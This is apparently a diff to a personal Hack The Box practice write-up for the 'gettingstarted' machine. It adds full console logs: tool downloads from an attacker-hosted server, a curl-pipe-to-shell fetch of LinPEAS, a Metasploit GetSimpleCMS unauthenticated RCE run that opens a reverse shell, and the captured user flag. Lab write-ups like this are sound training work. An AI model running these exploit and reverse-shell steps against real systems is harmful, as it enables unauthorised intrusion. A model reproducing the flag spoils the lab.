@@ -124,22 +124,41 @@ initial approach : used wget to download the script from a python http server ru
 
 .. code-block:: console
 
-   www-data@gettingstarted:/home/mrb3n$ wget 10.10.15.44:8000/LinEnum.sh
-   ...
-   LinEnum.sh: Permission denied
+    www-data@gettingstarted:/home/mrb3n$ wget 10.10.15.44:8000/LinEnum.sh
+    wget 10.10.15.44:8000/LinEnum.sh
+    --2025-06-24 07:38:10--  http://10.10.15.44:8000/LinEnum.sh
+    Connecting to 10.10.15.44:8000... connected.
+    HTTP request sent, awaiting response... 200 OK
+    Length: 46631 (46K) [text/x-sh]
+    LinEnum.sh: Permission denied
+
+    Cannot write to ‘LinEnum.sh’ (Permission denied).
 
 another approach : even directly using wget to download the script from github doesnt work :
 
 .. code-block:: console
 
-   www-data@gettingstarted:/home/mrb3n$ wget https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh
-   ...
-   wget: unable to resolve host address ‘raw.githubusercontent.com’
+    www-data@gettingstarted:/home/mrb3n$ wget https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh
+    <sercontent.com/rebootuser/LinEnum/master/LinEnum.sh
+    --2025-06-24 08:11:56--  https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh
+    Resolving raw.githubusercontent.com (raw.githubusercontent.com)... failed: Temporary failure in name resolution.
+    wget: unable to resolve host address ‘raw.githubusercontent.com’
+    also tried LinPEAS script but no DNS resolution available.
 
-also tried LinPEAS script but no DNS resolution available.
+also tried downloading the LinPEAS script, but since it's not able to resolve the host address, i dont think it'll work either :
 
-*(Filler: We can attempt SSH reverse tunneling or hosting scripts via IP for offline transfer.)*
+.. code-block:: console
 
+    www-data@gettingstarted:/home/mrb3n$ curl -L https://github.com/peass-ng/PEASS-ng/releases/latest/download/linpeas.sh | sh
+    <g/PEASS-ng/releases/latest/download/linpeas.sh | sh
+    % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
+                                    Dload  Upload   Total   Spent    Left  Speed
+    0     0    0     0    0     0      0      0 --:--:-- --:--:-- --:--:-  0     0    0     0    0     0      0      0 --:--:-- --:--:-- --:--:-  0     0    0     0    0     0      0      0 --:--:--  0:00:01 --:--:-  0     0    0     0    0     0      0      0 --:--:--  0:00:02 --:--:-  0     0    0     0    0     0      0      0 --:--:--  0:00:03 --:--:-  0     0    0     0    0     0      0      0 --:--:--  0:00:04 --:--:-  0     0    0     0    0     0      0      0 --:--:--  0:00:05 --:--:-  0     0    0     0    0     0      0      0 --:--:--  0:00:06 --:--:-  0     0    0     0    0     0      0      0 --:--:--  0:00:07 --:--:-  0     0    0     0    0     0      0      0 --:--:--  0:00:08 --:--:-  0     0    0     0    0     0      0      0 --:--:--  0:00:09 --:--:--     0curl: (6) Could not resolve host: github.com
+
+
+another approach : let's check if we can start an ssh server on the attack vm and get the box to connect to it. if it's possible, we'll try downloading the LinEnum script. It is important for us to use this script to check if there are any other glaring vulnerabilities we can exploit.
+
+--------------HERE--------------------
 
 
 check which commands require the mrb3n to use sudo
@@ -164,10 +183,146 @@ obtaining the user.txt flag
 
 .. code-block:: console
 
-   ┌──(kali-user㉿kali-linux)-[~/htb-practice/knowledge]
-   └─$ msfconsole
-   ...
-   7002d65b149b0a4d19132a66feed21d8
+    ┌──(kali-user㉿kali-linux)-[~/htb-practice/knowledge]
+    └─$ msfconsole       
+    Metasploit tip: View missing module options with show missing
+                                                    
+    # cowsay++
+    ____________
+    < metasploit >
+    ------------
+        \   ,__,
+            \  (oo)____
+            (__)    )\
+                ||--|| *
+
+
+        =[ metasploit v6.4.56-dev                          ]
+    + -- --=[ 2505 exploits - 1291 auxiliary - 431 post       ]
+    + -- --=[ 1610 payloads - 49 encoders - 13 nops           ]
+    + -- --=[ 9 evasion                                       ]
+
+    Metasploit Documentation: https://docs.metasploit.com/
+
+    msf6 > search exploit getcms
+
+    Matching Modules
+    ================
+
+    #  Name                                              Disclosure Date  Rank       Check  Description
+    -  ----                                              ---------------  ----       -----  -----------
+    0  exploit/multi/http/getsimplecms_unauth_code_exec  2019-04-28       excellent  Yes    GetSimpleCMS Unauthenticated RCE
+
+
+    Interact with a module by name or index. For example info 0, use 0 or use exploit/multi/http/getsimplecms_unauth_code_exec
+
+    msf6 > use 0 
+    [*] No payload configured, defaulting to php/meterpreter/reverse_tcp
+    msf6 exploit(multi/http/getsimplecms_unauth_code_exec) > show option
+    [-] Invalid parameter "option", use "show -h" for more information
+    msf6 exploit(multi/http/getsimplecms_unauth_code_exec) > show options
+
+    Module options (exploit/multi/http/getsimplecms_unauth_code_exec):
+
+    Name       Current Setting  Required  Description
+    ----       ---------------  --------  -----------
+    Proxies                     no        A proxy chain of format type
+                                            :host:port[,type:host:port][
+                                            ...]
+    RHOSTS                      yes       The target host(s), see http
+                                            s://docs.metasploit.com/docs
+                                            /using-metasploit/basics/usi
+                                            ng-metasploit.html
+    RPORT      80               yes       The target port (TCP)
+    SSL        false            no        Negotiate SSL/TLS for outgoi
+                                            ng connections
+    TARGETURI  /                yes       The base path to the cms
+    VHOST                       no        HTTP server virtual host
+
+
+    Payload options (php/meterpreter/reverse_tcp):
+
+    Name   Current Setting  Required  Description
+    ----   ---------------  --------  -----------
+    LHOST  192.168.78.128   yes       The listen address (an interface
+                                        may be specified)
+    LPORT  4444             yes       The listen port
+
+
+    Exploit target:
+
+    Id  Name
+    --  ----
+    0   GetSimpleCMS 3.3.15 and before
+
+
+
+    View the full module info with the info, or info -d command.
+
+    msf6 exploit(multi/http/getsimplecms_unauth_code_exec) > set RHOSTS 10.129.63.204
+    RHOSTS => 10.129.63.204
+    msf6 exploit(multi/http/getsimplecms_unauth_code_exec) > set LHOST tun0LHOST => 10.10.15.44
+    msf6 exploit(multi/http/getsimplecms_unauth_code_exec) > check
+    [+] 10.129.63.204:80 - The target is vulnerable.
+    msf6 exploit(multi/http/getsimplecms_unauth_code_exec) > show payloads
+
+    Compatible Payloads
+    ===================
+
+    #   Name                                        Disclosure Date  Rank    Check  Description
+    -   ----                                        ---------------  ----    -----  -----------
+    0   payload/cmd/unix/bind_aws_instance_connect  .                normal  No     Unix SSH Shell, Bind Instance Connect (via AWS API)
+    1   payload/generic/custom                      .                normal  No     Custom Payload
+    2   payload/generic/shell_bind_aws_ssm          .                normal  No     Command Shell, Bind SSM (via AWS API)
+    3   payload/generic/shell_bind_tcp              .                normal  No     Generic Command Shell, Bind TCP Inline
+    4   payload/generic/shell_reverse_tcp           .                normal  No     Generic Command Shell, Reverse TCP Inline
+    5   payload/generic/ssh/interact                .                normal  No     Interact with Established SSH Connection
+    6   payload/multi/meterpreter/reverse_http      .                normal  No     Architecture-Independent Meterpreter Stage, Reverse HTTP Stager (Multiple Architectures)
+    7   payload/multi/meterpreter/reverse_https     .                normal  No     Architecture-Independent Meterpreter Stage, Reverse HTTPS Stager (Multiple Architectures)
+    8   payload/php/bind_perl                       .                normal  No     PHP Command Shell, Bind TCP (via Perl)
+    9   payload/php/bind_perl_ipv6                  .                normal  No     PHP Command Shell, Bind TCP (via perl) IPv6
+    10  payload/php/bind_php                        .                normal  No     PHP Command Shell, Bind TCP (via PHP)
+    11  payload/php/bind_php_ipv6                   .                normal  No     PHP Command Shell, Bind TCP (via php) IPv6
+    12  payload/php/download_exec                   .                normal  No     PHP Executable Download and Execute
+    13  payload/php/exec                            .                normal  No     PHP Execute Command
+    14  payload/php/meterpreter/bind_tcp            .                normal  No     PHP Meterpreter, Bind TCP Stager
+    15  payload/php/meterpreter/bind_tcp_ipv6       .                normal  No     PHP Meterpreter, Bind TCP Stager IPv6
+    16  payload/php/meterpreter/bind_tcp_ipv6_uuid  .                normal  No     PHP Meterpreter, Bind TCP Stager IPv6 with UUID Support
+    17  payload/php/meterpreter/bind_tcp_uuid       .                normal  No     PHP Meterpreter, Bind TCP Stager with UUID Support
+    18  payload/php/meterpreter/reverse_tcp         .                normal  No     PHP Meterpreter, PHP Reverse TCP Stager
+    19  payload/php/meterpreter/reverse_tcp_uuid    .                normal  No     PHP Meterpreter, PHP Reverse TCP Stager
+    20  payload/php/meterpreter_reverse_tcp         .                normal  No     PHP Meterpreter, Reverse TCP Inline
+    21  payload/php/reverse_perl                    .                normal  No     PHP Command, Double Reverse TCP Connection (via Perl)
+    22  payload/php/reverse_php                     .                normal  No     PHP Command Shell, Reverse TCP (via PHP)
+
+    msf6 exploit(multi/http/getsimplecms_unauth_code_exec) > set payload 4
+    payload => generic/shell_reverse_tcp
+    msf6 exploit(multi/http/getsimplecms_unauth_code_exec) > run
+    [*] Started reverse TCP handler on 10.10.15.44:4444 
+    [*] Command shell session 2 opened (10.10.15.44:4444 -> 10.129.63.204:33924) at 2025-06-24 03:35:54 -0400
+
+    id
+    uid=33(www-data) gid=33(www-data) groups=33(www-data)
+    python3 -c 'import pty; pty.spawn("/bin/bash")'
+    www-data@gettingstarted:/var/www/html/theme$ ls
+    ls
+    Cardinal  Innovation  dFJMmjuOgysIkU.php  naNjathzIqT.php
+    www-data@gettingstarted:/$ cd /home
+    cd /home
+    www-data@gettingstarted:/home$ ls
+    ls
+    mrb3n
+    www-data@gettingstarted:/home$ cd mrb3n
+    cd mrb3n
+    www-data@gettingstarted:/home/mrb3n$ ls
+    ls
+    user.txt
+    www-data@gettingstarted:/home/mrb3n$ cat user.txt
+    cat user.txt
+    7002d65b149b0a4d19132a66feed21d8
+
+
+    `
 
 
 
